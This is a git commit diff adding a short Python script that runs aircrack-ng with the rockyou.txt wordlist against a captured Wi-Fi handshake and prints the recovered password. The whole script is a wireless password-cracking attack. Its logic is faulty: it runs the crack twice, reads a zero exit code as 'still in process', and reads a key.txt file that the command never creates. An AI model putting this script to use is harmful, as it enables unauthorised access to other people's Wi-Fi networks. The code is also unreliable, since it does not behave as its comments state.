cde569501dc0da2f2d0149d82d06cd25ad34454d
Dominik Hulin <109801079+Fattcat@users.noreply.github.com>
2023-12-28 21:19:31 +0000

    Update CrackHandShake.py

--- SRC/CrackHandShake.py
+++ SRC/CrackHandShake.py
@@ -1,1 +1,25 @@
 # CrackHandShake File going to be here :D
+
+import os
+
+# Path to captured handshake file
+captured_handshake = "capturedShake.cap"
+
+# Path to rockyou.txt
+rockyou_path = "/home/kali/Desktop/rockyou.txt"
+
+# Aircrack-ng command to crack the handshake
+aircrack_command = f"aircrack-ng -w {rockyou_path} {captured_handshake}"
+
+# Execute the aircrack-ng command
+os.system(aircrack_command)
+
+# Check if the process is still in progress
+if os.system(aircrack_command) == 0:
+    print("Still in process...")
+else:
+    print("Successfully completed")
+    # Extract and print the cracked password
+    with open("key.txt", "r") as key_file:
+        password = key_file.read().strip()
+        print(f"Password is: {password}")
